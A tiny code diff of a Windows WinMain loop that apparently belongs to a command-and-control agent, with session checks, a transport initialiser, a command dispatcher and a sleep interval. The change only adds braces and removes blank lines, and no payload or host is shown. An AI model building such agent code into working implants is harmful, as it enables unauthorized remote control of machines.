@@ -20,12 +20,11 @@ INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
 
     do {
         if (!Instance.Session.Connected) {
-            if(TransportInit())
-
-            CommandDispatcher();
+            if(TransportInit()) {
+                CommandDispatcher();
+            }
 
         }
-
 
         Sleep( Instance.Config.Sleeping * 1000 );
 
